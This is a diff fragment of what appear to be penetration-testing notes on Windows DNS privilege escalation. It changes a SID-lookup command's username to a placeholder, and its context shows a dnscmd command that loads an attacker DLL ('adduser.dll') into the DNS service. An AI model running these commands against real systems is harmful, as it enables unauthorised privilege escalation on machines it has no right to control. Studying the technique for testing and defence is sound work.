@@ -10,7 +10,7 @@ dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 
 # Finding User's SID
 ```powershell
-wmic useraccount where name="netadm" get sid
+wmic useraccount where name="<CURRENT USER>" get sid
 ```
 
 # Checking Permissions on DNS Service
